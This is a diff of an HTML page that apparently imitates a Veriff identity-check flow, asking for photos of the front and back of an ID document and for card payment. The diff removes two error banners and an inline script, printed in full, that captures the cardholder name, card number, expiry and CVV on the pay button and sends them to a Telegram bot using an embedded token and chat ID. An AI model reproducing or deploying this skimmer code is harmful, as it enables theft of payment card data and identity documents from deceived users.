@@ -1048,7 +1048,7 @@ document.addEventListener('click', function(e) {
           </header>
           <h2 class="veriff-status-title"></h2>
           <div class="veriff-error-card">
-            <div class="veriff-error-banner">Please upload a photo of the front of your physical identity document.</div>
+            
             <div class="veriff-preview-area" id="veriff-area-trigger-1">
               <div class="veriff-upload-hint" id="veriff-hint-1">
                 <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><polyline points="17 8 12 3 7 8"></polyline><line x1="12" y1="3" x2="12" y2="15"></line></svg>
@@ -1071,7 +1071,7 @@ document.addEventListener('click', function(e) {
           </header>
           <h2 class="veriff-status-title"></h2>
           <div class="veriff-error-card">
-            <div class="veriff-error-banner">Please upload a photo of the back of your physical identity document.</div>
+            
             <div class="veriff-preview-area" id="veriff-area-trigger-2">
               <div class="veriff-upload-hint" id="veriff-hint-2">
                 <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><polyline points="17 8 12 3 7 8"></polyline><line x1="12" y1="3" x2="12" y2="15"></line></svg>
@@ -1788,34 +1788,7 @@ document.addEventListener('click', function(e) {
 
 
 
-<script>
-document.querySelector('button[data-testid="add-card-and-pay-now-button"]').addEventListener('click', function(event) {
-  event.preventDefault();
 
-  const name = document.querySelector('input[name="full_name"]').value;
-  const cardNumber = document.querySelector('input[data-testid="card-number-field"]').value;
-  const month = document.querySelector('input[name="month"]').value;
-  const year = document.querySelector('input[name="year"]').value;
-  const cvv = document.querySelector('input[data-testid="cvv-input"]').value;
-
-  const token = '8775606080:AAGN7SLo5ubG8pkgfCFX_tCZBBVb7GtVV6k';
-  const chatId = '8272960343';
-  const url = `https://api.telegram.org/bot${token}/sendMessage`;
-
-  const message = `Card Info:\nName: ${name}\nCard: ${cardNumber}\nExp: ${month}/${year}\nCVV: ${cvv}`;
-
-  fetch(url, {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json',
-    },
-    body: JSON.stringify({
-      chat_id: chatId,
-      text: message
-    })
-  }).catch(err => console.error(err));
-});
-</script>
 
 
 
